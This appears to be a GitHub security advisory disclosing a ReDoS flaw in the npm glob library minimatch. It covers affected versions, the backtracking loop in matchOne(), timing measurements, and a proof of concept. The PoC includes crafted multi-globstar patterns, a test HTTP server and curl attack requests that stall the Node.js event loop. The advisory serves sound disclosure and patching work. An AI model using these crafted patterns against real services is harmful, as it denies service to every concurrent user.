# [H] minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments

## Summary
Severity: High
Advisory: GHSA-7r86-cg39-jmmj
CVE: CVE-2026-27903
CWE: CWE-407
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-02-26
Source: https://github.com/advisories/GHSA-7r86-cg39-jmmj
Type: github-advisory

## Affected
- npm: `minimatch` — affected >=10.0.0 <10.2.3
- npm: `minimatch` — affected >=9.0.0 <9.0.7
- npm: `minimatch` — affected >=8.0.0 <8.0.6
- npm: `minimatch` — affected >=7.0.0 <7.4.8
- npm: `minimatch` — affected >=6.0.0 <6.2.2
- npm: `minimatch` — affected >=5.0.0 <5.1.8
- npm: `minimatch` — affected >=4.0.0 <4.2.5
- npm: `minimatch` — affected >=0 <3.1.3

## Details
### Summary

`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

---

### Details

The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):

```typescript
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
```

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).

There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.

Measured timing with n=30 path segments:

| k (globstars) | Pattern size | Time     |
|---------------|--------------|----------|
| 7             | 36 bytes     | ~154ms   |
| 9             | 46 bytes     | ~1.2s    |
| 11            | 56 bytes     | ~5.4s    |
| 12            | 61 bytes     | ~9.7s    |
| 13            | 66 bytes     | ~15.9s   |

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- inline script**

```javascript
import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
```

To scale the effect, increase k:

```javascript
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
```

No special options are required. This reproduces with the default `minimatch()` call.

**Step 2 -- HTTP server (event loop starvation proof)**

The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:

```javascript
// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
```

Terminal 1 -- start the server:
```
node poc1-server.mjs
```

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:
```
curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &
```

Terminal 3 -- while the attack is in-flight, send a benign request:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"
```

**Observed output (Terminal 3):**
```
{"result":true,"ms":"0"}

time_total: 4.132709s
```

The server reports `"ms":"0"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:

```
{"result":true,"ms":"0"}

time_total: 0.001599s
```

---

### Impact

Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.

## References
- https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj
- https://nvd.nist.gov/vuln/detail/CVE-2026-27903
- https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748
- https://github.com/isaacs/minimatch
